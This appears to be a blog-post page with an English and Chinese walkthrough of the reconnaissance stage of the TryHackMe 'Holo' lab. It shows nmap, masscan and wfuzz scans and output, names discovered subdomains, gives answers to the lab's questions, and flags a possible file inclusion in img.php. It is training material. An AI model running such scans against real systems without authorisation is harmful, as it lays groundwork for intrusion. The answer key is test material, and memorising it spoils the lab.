@@ -1,0 +1,943 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="TryHackMe-Holo  Recon:1234567891011121314151617Starting Nmap 7.92SVN ( https:&#x2F;&#x2F;google.com ) at 2022-07-05 15:53 CSTStats: 0:01:16 elapsed; 0 hosts completed (0 up), 256 undergoing Ping ScanPing Scan T">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe-Holo">
+<meta property="og:url" content="http://example.com/2022/10/06/TryHackMe-Holo/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="TryHackMe-Holo  Recon:1234567891011121314151617Starting Nmap 7.92SVN ( https:&#x2F;&#x2F;google.com ) at 2022-07-05 15:53 CSTStats: 0:01:16 elapsed; 0 hosts completed (0 up), 256 undergoing Ping ScanPing Scan T">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/2315464.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220705160754870.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220705170518255.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220705171259290.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220705195528103.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220705195908610.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220705200431538.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220705201103931.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220705201515666.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220705203539493.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220705203630736.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220705212658470.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220705220945411.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220706184049511.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.881Z">
+<meta property="article:modified_time" content="2022-07-09T08:08:38.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Active Directory">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/2315464.png">
+  
+  
+  
+  <title>TryHackMe-Holo - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="TryHackMe-Holo"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          43k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          360 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">TryHackMe-Holo</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>TryHackMe-Holo</p>
+<p><img src="https://www.worldisend.com/img/2315464.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="下载"></p>
+<h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting Nmap 7.92SVN ( https://google.com ) at 2022-07-05 15:53 CST<br>Stats: 0:01:16 elapsed; 0 hosts completed (0 up), 256 undergoing Ping Scan<br>Ping Scan Timing: About 56.30% <span class="hljs-keyword">done</span>; ETC: 15:55 (0:00:59 remaining)<br>Stats: 0:01:48 elapsed; 254 hosts completed (2 up), 2 undergoing SYN Stealth Scan<br>SYN Stealth Scan Timing: About 80.90% <span class="hljs-keyword">done</span>; ETC: 15:55 (0:00:05 remaining)<br>Nmap scan report <span class="hljs-keyword">for</span> 10.200.112.33<br>Host is up (0.31s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap scan report <span class="hljs-keyword">for</span> 10.200.112.250<br>Host is up (0.28s latency).<br>Not shown: 999 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br></code></pre></td></tr></table></figure>
+
+<p>同网段在除了WEB服务器外还有另一台10.200.112.250主机，但不知道是做什么的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo masscan -p1-65535,U:1-65535 10.200.112.33 --rate 2000 -e tun0<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-07-05 07:58:22 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 33060/tcp on 10.200.112.33                                <br>Discovered open port 22/tcp on 10.200.112.33                                   <br>Discovered open port 80/tcp on 10.200.112.33<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Tue Jul  5 16:01:23 2022 as: nmap -sC -sV -Pn -p80,33060,22 -oA holoweb 10.200.112.33</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.200.112.33<br>Host is up (0.35s latency).<br><br>PORT      STATE SERVICE VERSION<br>22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br>80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>|_http-generator: WordPress 5.5.3<br>| http-robots.txt: 21 disallowed entries (15 shown)<br>| /var/www/wordpress/index.php <br>| /var/www/wordpress/readme.html /var/www/wordpress/wp-activate.php <br>| /var/www/wordpress/wp-blog-header.php /var/www/wordpress/wp-config.php <br>| /var/www/wordpress/wp-content /var/www/wordpress/wp-includes <br>| /var/www/wordpress/wp-load.php /var/www/wordpress/wp-mail.php <br>| /var/www/wordpress/wp-signup.php /var/www/wordpress/xmlrpc.php <br>| /var/www/wordpress/license.txt /var/www/wordpress/upgrade <br>|_/var/www/wordpress/wp-admin /var/www/wordpress/wp-comments-post.php<br>|_http-title: holo.live<br>33060/tcp open  mysqlx?<br>| fingerprint-strings: <br>|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: <br>|     Invalid message<span class="hljs-string">&quot;</span><br><span class="hljs-string">|_    HY000</span><br><span class="hljs-string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://google.com/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-string">SF-Port33060-TCP:V=7.92SVN%I=7%D=7/5%Time=62C3EFDA%P=x86_64-unknown-linux-</span><br><span class="hljs-string">SF:gnu%r(NULL,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="hljs-string">&quot;)%r(GenericLines,9,&quot;</span>\x05\0\0<br>SF:\0\x0b\x08\x05\x1a\0<span class="hljs-string">&quot;)%r(GetRequest,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="hljs-string">&quot;)%r</span><br><span class="hljs-string">SF:(HTTPOptions,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="hljs-string">&quot;)%r(RTSPRequest,9,&quot;</span>\x05\0\<br>SF:0\0\x0b\x08\x05\x1a\0<span class="hljs-string">&quot;)%r(RPCCheck,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="hljs-string">&quot;)%r(</span><br><span class="hljs-string">SF:DNSVersionBindReqTCP,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="hljs-string">&quot;)%r(DNSStatusReque</span><br><span class="hljs-string">SF:stTCP,2B,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88<span class="hljs-string">&#x27;\x</span><br><span class="hljs-string">SF:1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(Help,9,&quot;\x05\0\0\0\x0b\x08\x05\</span><br><span class="hljs-string">SF:x1a\0&quot;)%r(SSLSessionReq,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\</span><br><span class="hljs-string">SF:x08\x01\x10\x88&#x27;</span>\x1a\x0fInvalid\x20message\&quot;\x05HY000<span class="hljs-string">&quot;)%r(TerminalServe</span><br><span class="hljs-string">SF:rCookie,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="hljs-string">&quot;)%r(TLSSessionReq,2B,&quot;</span>\x05\0\0\<br>SF:0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88<span class="hljs-string">&#x27;\x1a\x0fInvalid\x20me</span><br><span class="hljs-string">SF:ssage\&quot;\x05HY000&quot;)%r(Kerberos,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SMBPr</span><br><span class="hljs-string">SF:ogNeg,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(X11Probe,2B,&quot;\x05\0\0\0\x0b\x</span><br><span class="hljs-string">SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#x27;</span>\x1a\x0fInvalid\x20message\&quot;<br>SF:\x05HY000<span class="hljs-string">&quot;)%r(FourOhFourRequest,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="hljs-string">&quot;)%r(LPD</span><br><span class="hljs-string">SF:String,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="hljs-string">&quot;)%r(LDAPSearchReq,2B,&quot;</span>\x05\0\0\0<br>SF:\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88<span class="hljs-string">&#x27;\x1a\x0fInvalid\x20mes</span><br><span class="hljs-string">SF:sage\&quot;\x05HY000&quot;)%r(LDAPBindReq,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SIP</span><br><span class="hljs-string">SF:Options,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LANDesk-RC,9,&quot;\x05\0\0\0\x0</span><br><span class="hljs-string">SF:b\x08\x05\x1a\0&quot;)%r(TerminalServer,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(</span><br><span class="hljs-string">SF:NCP,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(NotesRPC,2B,&quot;\x05\0\0\0\x0b\x08</span><br><span class="hljs-string">SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#x27;</span>\x1a\x0fInvalid\x20message\&quot;\x<br>SF:05HY000<span class="hljs-string">&quot;)%r(JavaRMI,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="hljs-string">&quot;)%r(WMSRequest,9,&quot;</span>\<br>SF:x05\0\0\0\x0b\x08\x05\x1a\0<span class="hljs-string">&quot;)%r(oracle-tns,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1<br>SF:a\0<span class="hljs-string">&quot;)%r(ms-sql-s,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="hljs-string">&quot;)%r(afp,2B,&quot;</span>\x05\0\0\0<br>SF:\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88<span class="hljs-string">&#x27;\x1a\x0fInvalid\x20mes</span><br><span class="hljs-string">SF:sage\&quot;\x05HY000&quot;)%r(giop,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;);</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://google.com/submit/ .</span><br><span class="hljs-string"># Nmap done at Tue Jul  5 16:02:14 2022 -- 1 IP address (1 host up) scanned in 50.87 seconds</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>What is the last octet of the IP address of the public-facing web server?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">33<br></code></pre></td></tr></table></figure>
+
+<p><strong>How many ports are open on the web server?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">3<br></code></pre></td></tr></table></figure>
+
+<p><strong>What CME is running on port 80 of the web server?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">WordPress<br></code></pre></td></tr></table></figure>
+
+<p><strong>What version of the CME is running on port 80 of the web server?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">5.5.3<br></code></pre></td></tr></table></figure>
+
+<p><strong>What is the HTTP title of the web server?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">holo.live<br></code></pre></td></tr></table></figure>
+
+<p>将holo.live添加进本地hosts文件无法正常访问，但是<a target="_blank" rel="noopener" href="http://www.holo.live可以./">www.holo.live可以。</a></p>
+<p><img src="https://www.worldisend.com/img/image-20220705160754870.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220705160754870"></p>
+<p>右上角一个搜索框，可能存在SQL注入。PHP脚本环境，Ubuntu操作系统。而且Nmap扫到了robots.txt：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://www.holo.live/robots.txt<br>User-Agent: *<br>Disallow: /var/www/wordpress/index.php<br>Disallow: /var/www/wordpress/readme.html<br>Disallow: /var/www/wordpress/wp-activate.php<br>Disallow: /var/www/wordpress/wp-blog-header.php<br>Disallow: /var/www/wordpress/wp-config.php<br>Disallow: /var/www/wordpress/wp-content<br>Disallow: /var/www/wordpress/wp-includes<br>Disallow: /var/www/wordpress/wp-load.php<br>Disallow: /var/www/wordpress/wp-mail.php<br>Disallow: /var/www/wordpress/wp-signup.php<br>Disallow: /var/www/wordpress/xmlrpc.php<br>Disallow: /var/www/wordpress/license.txt<br>Disallow: /var/www/wordpress/upgrade<br>Disallow: /var/www/wordpress/wp-admin<br>Disallow: /var/www/wordpress/wp-comments-post.php<br>Disallow: /var/www/wordpress/wp-config-sample.php<br>Disallow: /var/www/wordpress/wp-cron.php<br>Disallow: /var/www/wordpress/wp-links-opml.php<br>Disallow: /var/www/wordpress/wp-login.php<br>Disallow: /var/www/wordpress/wp-settings.php<br>Disallow: /var/www/wordpress/wp-trackback.php<br></code></pre></td></tr></table></figure>
+
+<p>如果wordpress目录对应的是这个wordpress站点的话，那么目标可能还存在其他站点。正好官方的问题也是这么问的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://holo.live -H <span class="hljs-string">&quot;Host: FUZZ.holo.live&quot;</span> --hw 1402<br> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="hljs-string">&#x27;s documentation for more information.</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string"></span><br><span class="hljs-string">Target: http://holo.live/</span><br><span class="hljs-string">Total requests: 19966</span><br><span class="hljs-string"></span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string">ID           Response   Lines    Word       Chars       Payload                                                                                                                        </span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">000000001:   200        155 L    1398 W     21405 Ch    &quot;www&quot;                                                                                                                                                                         </span><br><span class="hljs-string">000000024:   200        75 L     158 W      1845 Ch     &quot;admin&quot;                                                                                                                                                                       </span><br><span class="hljs-string">000000019:   200        271 L    701 W      7515 Ch     &quot;dev&quot;                                                           </span><br><span class="hljs-string">Total time: 0</span><br><span class="hljs-string">Processed Requests: 19966</span><br><span class="hljs-string">Filtered Requests: 19958</span><br><span class="hljs-string">Requests/sec.: 0</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>What domains loads images on the first web page?</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">www.holo.live<br></code></pre></td></tr></table></figure>
+
+<p><strong>What are the two other domains present on the web server? Format: Alphabetical Order</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dev<span class="hljs-selector-class">.holo</span><span class="hljs-selector-class">.live</span>,admin<span class="hljs-selector-class">.holo</span>.live<br></code></pre></td></tr></table></figure>
+
+<p>查看dev.holo.live源码可以看到如下代码,img.php或许存在文件包含？</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs http">	&lt;div class=&quot;fh5co-text&quot;&gt;<br>		&lt;h2&gt;Korone Inugami&lt;/h2&gt;<br>		&lt;span&gt;Yubi Yubi!&lt;/span&gt;<br>		&lt;/div&gt;<br>	&lt;/a&gt;<br>&lt;/div&gt;<br>&lt;div class=&quot;col-md-4 col-sm-6 col-xxs-12&quot;&gt;<br>	&lt;a href=&quot;img.php?file=images/fubuki.jpg&quot; class=&quot;fh5co-project-item image-popup to-animate&quot;&gt;<br>		&lt;img src=&quot;img.php?file=images/fubuki.jpg&quot; alt=&quot;Image&quot; class=&quot;img-responsive&quot;&gt;<br>		&lt;div class=&quot;fh5co-text&quot;&gt;<br>		&lt;h2&gt;Fubuki Shirakami&lt;/h2&gt;<br>		&lt;span&gt;No No No foxu!&lt;/span&gt;<br>		&lt;/div&gt;<br>	&lt;/a&gt;<br>&lt;/div&gt;<br><br>&lt;div class=&quot;clearfix visible-sm-block&quot;&gt;&lt;/div&gt;<br><br>&lt;div class=&quot;col-md-4 col-sm-6 col-xxs-12&quot;&gt;<br>	&lt;a href=&quot;img.php?file=images/miko.jpg&quot; class=&quot;fh5co-project-item image-popup to-animate&quot;&gt;<br>		&lt;img src=&quot;img.php?file=images/miko.jpg&quot; alt=&quot;Image&quot; class=&quot;img-responsive&quot;&gt;<br>		&lt;div class=&quot;fh5co-text&quot;&gt;<br>		&lt;h2&gt;Miko Sakura&lt;/h2&gt;<br>		&lt;span&gt;Stay Home!&lt;/span&gt;<br>		&lt;/div&gt;<br>	&lt;/a&gt;<br>&lt;/div&gt;<br>&lt;div class=&quot;col-md-4 col-sm-6 col-xxs-12&quot;&gt;<br>	&lt;a href=&quot;img.php?file=images/okayu.jpg&quot; class=&quot;fh5co-project-item image-popup to-animate&quot;&gt;<br>		&lt;img src=&quot;img.php?file=images/okayu.jpg&quot; alt=&quot;Image&quot; class=&quot;img-responsive&quot;&gt;<br>		&lt;div class=&quot;fh5co-text&quot;&gt;<br>		&lt;h2&gt;Okayu Nekomata&lt;/h2&gt;<br>		&lt;span&gt;Nya~&lt;/span&gt;<br>		&lt;/div&gt;<br></code></pre></td></tr></table></figure>
+
